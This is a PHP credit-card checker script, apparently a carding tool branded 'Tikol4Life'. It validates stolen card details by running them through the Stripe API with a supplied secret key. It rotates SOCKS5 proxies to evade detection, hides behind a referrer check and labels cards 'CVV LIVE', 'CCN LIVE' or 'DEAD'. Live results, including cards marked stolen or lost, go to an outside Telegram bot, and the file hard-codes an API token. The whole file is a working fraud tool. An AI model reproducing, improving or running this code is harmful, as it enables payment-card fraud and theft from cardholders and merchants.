<?php
/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include 'config.php';
if ($_GET['referrer'] != "Tikol4Life") { 
	$i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
	exit();
}

/*===[Variable Setup]=========================================*/
$cc_info = $_GET['cc_info'];
$sk = $_GET['sk'];
$telebot = $_GET['telebot'];
$tele_msg = $_GET['tele_msg'];

/*===[CC Info Validation]=====================================*/
if($cc_info == "" || $sk == ""){
    exit();
}

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[Webshare Setup]=========================================*/
// Create your own account at https://www.webshare.io/
// Get api token at https://proxy.webshare.io/userapi/keys
$webshare_token = "2e1e9231c4d312a310810e825aa34915af09bcaa"; 
$prox = curl_init();
curl_setopt($prox, CURLOPT_URL, 'https://proxy.webshare.io/api/proxy/list/');
curl_setopt($prox, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($prox, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Authorization: Token '.$webshare_token.'';
curl_setopt($prox, CURLOPT_HTTPHEADER, $headers);
$result1 = curl_exec($prox);
curl_close($prox);

$prox_res = json_decode($result1, 1);
$count = $prox_res['count'];
$random = rand(0,$count-1);

$proxy_ip = $prox_res['results'][$random]['proxy_address'];
$proxy_port = $prox_res['results'][$random]['ports']['socks5'];
$proxy_user = $prox_res['results'][$random]['username'];
$proxy_pass = $prox_res['results'][$random]['password'];

$proxy = ''.$proxy_ip.':'.$proxy_port.'';
$credentials = ''.$proxy_user.':'.$proxy_pass.'';
$useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";

/*===[cURL Processes]=========================================*/
/* 1st cURL */
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch1, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch1, CURLOPT_PROXY, $proxy);
curl_setopt($ch1, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch1, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch1, CURLOPT_USERAGENT,$useragent);
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch1, CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER,0);
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
if (curl_errno($ch1)) {
    echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Connection Timeout</span>
            </div>';
    exit();
}
curl_close($ch1);

/* 1st cURL Response */
$res1 = json_decode($curl1, true);
$card = $res1['card']['id'];

if(isset($res1['id'])){
    /* 2nd cURL */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch2, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch2, CURLOPT_PROXY, $proxy);
    curl_setopt($ch2, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch2, CURLOPT_PROXYUSERPWD,$credentials);
	curl_setopt($ch2, CURLOPT_USERAGENT,$useragent);
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=$email&description=Tikol4Life&source=".$res1["id"]);
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch2, CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER,0);
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    if (curl_errno($ch2)) {
        echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Connection Timeout</span>
                </div>';
        exit();
    }
    curl_close($ch2);

    /* 2nd cURL Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];

}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd cURL */
    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch3, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch3, CURLOPT_PROXY, $proxy);
    curl_setopt($ch3, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch3, CURLOPT_PROXYUSERPWD,$credentials);
	curl_setopt($ch3, CURLOPT_USERAGENT,$useragent);
    curl_setopt($ch3, CURLOPT_URL, "https://api.stripe.com/v1/customers/$cus/sources/$card");
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch3, CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER,0);
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $curl3 = curl_exec($ch3);
    if (curl_errno($ch3)) {
        echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Connection Timeout</span>
                </div>';
        exit();
    }
    curl_close($ch3);

    /* 3rd cURL Response */
    $res3 = json_decode($curl3, true);

}


/*===[cURL Response Setup]====================================*/
if(isset($res1['error'])){
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;
    
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A");
            }
        }
        echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "1"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A");
            }
        }
        echo '<div class="live_cvv" style="display:none;">
            <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Lost Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A");
            }
        }
        echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Stolen Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A");
            }
        }
        echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Token Error</span>
            </div>';
    }elseif($res1['error']['type'] == "invalid_request_error"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Invalid SK Provided</span>
            </div>';
    }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //VERIFY NUMBER
        echo '<div class="dead" style="display:none;">
        <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }else{
        //DEAD
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }
}else{
    if (isset($res2['error'])) {
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A");
                }
            }
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "1"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A");
                }
            }
            echo '<div class="live_cvv" style="display: none;">
            <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A");
                }
            }
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A");
                }
            }
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }else{
            //DEAD
            echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }
    }else{
        if (isset($res2['sources'])) {
            $cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A");
                    }
                }
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res2.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res2.'</span>
                </div>';
            }
        }else{
            $cvc_res3 = $res3['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A");
                    }
                }
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res3.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res3.'</span>
                </div>';
            }
        }
    }
}






/*===[PHP Functions]==========================================*/
function BotForwarder($message){
    $url = $GLOBALS['token_url']."/sendMessage?chat_id=".$GLOBALS['telebot']."&text=".$message."&parse_mode=HTML";
    file_get_contents($url); 
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
?>